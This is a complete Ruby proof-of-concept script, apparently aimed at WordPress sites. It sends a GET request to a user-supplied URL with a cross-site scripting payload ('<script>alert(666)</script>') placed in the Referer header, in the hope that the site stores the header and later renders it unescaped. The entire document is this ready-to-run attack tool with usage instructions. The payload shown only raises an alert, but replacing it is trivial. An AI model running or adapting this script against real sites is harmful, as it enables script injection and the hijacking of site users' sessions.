 
require "net/http"
require "uri"
 
if(ARGV.length == 1)
    uri = URI.parse(ARGV[0])
    http = Net::HTTP.new(uri.host, uri.port)
    #http.set_debug_output($stderr)
    request = Net::HTTP::Get.new(uri.request_uri)
    request["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:19.0) Gecko/20100101 Firefox/19.0"
    request["Referer"] = "https://www.example.com/b/<script>alert(666)</script>"
    http.request(request)
    puts "Have a nice day :-)"
else
    puts "Usage:\t\truby #{__FILE__} [WordPress URL]"
    puts "Example:\truby #{__FILE__} http://www.example.com/wordpress/?p=1\n"
end
